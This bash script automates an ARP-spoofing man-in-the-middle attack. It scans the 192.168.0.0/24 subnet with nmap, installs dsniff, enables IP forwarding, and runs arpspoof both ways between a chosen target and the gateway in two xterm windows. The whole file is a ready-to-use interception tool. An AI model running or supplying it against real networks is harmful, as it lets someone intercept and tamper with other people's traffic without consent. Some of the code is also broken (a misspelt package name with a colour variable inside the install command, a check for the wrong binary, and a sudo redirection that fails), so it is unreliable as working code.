#!/bin/bash
#Based on post at:
#http://www.reddit.com/r/linux/comments/qagsu/easy_colors_for_shell_scripts_color_library/

 bold=`echo -en "\e[1m"`
 underline=`echo -en "\e[4m"`
 dim=`echo -en "\e[2m"`
 strickthrough=`echo -en "\e[9m"`
 blink=`echo -en "\e[5m"`
 reverse=`echo -en "\e[7m"`
 hidden=`echo -en "\e[8m"`
 normal=`echo -en "\e[0m"`
 black=`echo -en "\e[30m"`
 red=`echo -en "\e[31m"`
 green=`echo -en "\e[32m"`
 orange=`echo -en "\e[33m"`
 blue=`echo -en "\e[34m"`
 purple=`echo -en "\e[35m"`
 aqua=`echo -en "\e[36m"`
 gray=`echo -en "\e[37m"`
 darkgray=`echo -en "\e[90m"`
 lightred=`echo -en "\e[91m"`
 lightgreen=`echo -en "\e[92m"`
 lightyellow=`echo -en "\e[93m"`
 lightblue=`echo -en "\e[94m"`
 lightpurple=`echo -en "\e[95m"`
 lightaqua=`echo -en "\e[96m"`
 white=`echo -en "\e[97m"`
 default=`echo -en "\e[39m"`
 BLACK=`echo -en "\e[40m"`
 RED=`echo -en "\e[41m"`
 GREEN=`echo -en "\e[42m"`
 ORANGE=`echo -en "\e[43m"`
 BLUE=`echo -en "\e[44m"`
 PURPLE=`echo -en "\e[45m"`
 AQUA=`echo -en "\e[46m"`
 GRAY=`echo -en "\e[47m"`
 DARKGRAY=`echo -en "\e[100m"`
 LIGHTRED=`echo -en "\e[101m"`
 LIGHTGREEN=`echo -en "\e[102m"`
 LIGHTYELLOW=`echo -en "\e[103m"`
 LIGHTBLUE=`echo -en "\e[104m"`
 LIGHTPURPLE=`echo -en "\e[105m"`
 LIGHTAQUA=`echo -en "\e[106m"`
 WHITE=`echo -en "\e[107m"`
 DEFAULT=`echo -en "\e[49m"`

if [[ $EUID -ne 0 ]];
then
	echo "${red}This script must be run as root"
	sleep 1
	exit
fi


gateway=`route -n | grep "Gateway" -A1 | tail -n1 | awk '{print $2}'`
interface=`ip addr | grep "state UP" | awk '{print $2}' | cut -f1 -d ':'`
scanner=`nmap -sn 192.168.0.0/24 | grep "for" -A0 | awk '{print $5}'`
myip=`ifconfig | grep "netmask" | tail -n1 | awk '{print $2}'`

echo -n "${red} + ${blue}check xterm: "
sleep 2
if hash xterm 2>/dev/null;
then
	echo "${green}installed"
else
	echo "${red}not installed"
	echo "${green}installing"
	sleep 2
	`sudo apt install xterm --yes`
fi

echo -n "${red} + ${blue}check arpspoof: "
sleep 2
if hash dsniff 2>/dev/null;
then
	echo "${green}installed"
else
	echo "${red}not intalled"
	echo "${green} installing"
	sleep 2
	`${blue}sudo apt install dnsiff --yes`
fi
echo -n "${red} + ${blue}enable IP FORWARD (y/n): "
read input
if [ $input == y ];
then
	`echo 1 > /proc/sys/net/ipv4/ip_forward`
	sleep 1
	echo "${green}ip forward enable"
else
	`sudo echo 0 > /proc/sys/net/ipv4/ip_forward`
	sleep 1
	echo "${green}ip forward disable"
fi

echo "${red} + ${blue}ip gateway: ${green}$gateway"
echo "${red} + ${blue}interface: ${green}$interface"
echo -n "${red} + ${blue}ip target: "
echo -n ${green}$scanner
echo ""
echo "${red} + ${blue}my ip: ${green}$myip"

echo -n "${red} + ${lightyellow}enter target ip: ${blue}"
read ipt
echo -n "${red} + ${lightyellow}enter your ip gateway: ${blue}"
read ipg
echo -n "${red} + ${lightyellow}enter your interface: ${blue}"
read inter
echo "${red} press CTRL + C to stop"

xterm -title "arpspoofing $ipt to $ipg" -hold -e "arpspoof -i $inter -t $ipt $ipg" &
xterm -title "arpspoofing $ipg to $ipt" -hold -e "arpspoof -i $inter -t $ipg $ipt"

clear